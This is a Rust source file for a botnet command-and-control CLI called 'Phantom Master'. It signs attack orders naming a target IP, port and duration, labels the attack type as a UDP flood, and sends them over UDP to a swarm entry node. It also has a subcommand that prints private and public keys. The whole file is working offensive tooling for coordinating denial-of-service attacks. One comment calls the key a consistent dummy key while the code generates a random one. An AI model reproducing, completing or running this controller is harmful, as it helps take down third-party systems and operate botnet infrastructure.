use log::{info, error};
use clap::{Parser, Subcommand};
use std::net::UdpSocket;
use ed25519_dalek::{SigningKey, Signer};
use rand::rngs::OsRng;
use protocol::{PhantomPacket, PROTOCOL_MAGIC, PACKET_TYPE_CMD};

#[derive(Parser)]
#[command(name = "Phantom Master")]
#[command(version = "1.0")]
#[command(about = "Command Injection CLI for Phantom Swarm", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Ping the swarm
    Ping,
    /// Launch an Attack
    Attack {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        port: u16,
        #[arg(short, long)]
        duration: u32,
    },
    /// Generate a new Keypair
    Keygen,
}

fn main() {
    env_logger::init();
    let cli = Cli::parse();
    
    // Master Key (Hardcoded for dev, should be loaded from file)
    // Generating consistent dummy key for dev
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let pub_key = signing_key.verifying_key();
    
    info!("Master Controller Started. ID: {}", hex::encode(pub_key.to_bytes()));

    match &cli.command {
        Commands::Ping => {
            info!("Sending Ping to Swarm...");
            // TODO: Construct Ping Packet
        }
        Commands::Attack { target, port, duration } => {
            info!("Injecting Attack Command -> {}:{} ({}s)", target, port, duration);
            
            // Construct Payload: [Type(1)][IP(4)][Port(2)][Duration(4)]
            // This is "AttackPayload" logic
            let mut payload = Vec::new();
            payload.push(1); // Attack Type: UDP Flood (Example)
            
            // Parse IP
            let ip_octets: Vec<u8> = target.split('.')
                .map(|s| s.parse().unwrap_or(0))
                .collect();
            payload.extend_from_slice(&ip_octets);
            payload.extend_from_slice(&port.to_be_bytes());
            payload.extend_from_slice(&duration.to_be_bytes());
            
            // Create Binary Protocol Packet
            let packet = PhantomPacket::new_cmd(
                rand::random::<u32>(), // Nonce
                payload,
                &signing_key
            );
            
            let bytes = packet.to_bytes();
            
            // Inject to Swarm (UDP Gossip Entry Point)
            // In reality, Master connects to a few known nodes
            let socket = UdpSocket::bind("0.0.0.0:0").expect("Bind failed");
            let swarm_entry = "127.0.0.1:31337"; 
            socket.send_to(&bytes, swarm_entry).expect("Send failed");
            info!("Command Injected ({} bytes) -> {}", bytes.len(), swarm_entry);
        }
        Commands::Keygen => {
            println!("Private Key: {}", hex::encode(signing_key.to_bytes()));
            println!("Public Key:  {}", hex::encode(pub_key.to_bytes()));
        }
    }
}
